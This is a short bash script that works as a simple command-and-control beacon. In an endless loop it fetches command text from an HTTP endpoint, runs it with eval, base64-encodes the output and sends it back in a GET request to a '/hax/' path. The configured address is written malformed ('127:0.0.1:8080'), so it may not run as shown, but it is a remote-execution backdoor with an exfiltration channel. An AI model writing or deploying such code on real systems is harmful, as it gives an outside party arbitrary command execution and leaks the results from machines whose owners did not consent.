#!/usr/bin/env bash

while true; do
        url="127:0.0.1:8080"
        a=$(curl  -X GET "$url/cli")
        if [ "$a" != "" ]; then
                b=$(eval $a 2>&1)
                for ((i=0;i<${#b};i++)) do
                        printf "%s." ${b:i:1}
                done
                c=$(echo -n "$b" | base64)
                e="http://$url/hax/"
                d="$e$c"
                echo $d
                curl  -X GET $d
                sleep 2
        else
                sleep 2
                echo "it works"
        fi


done
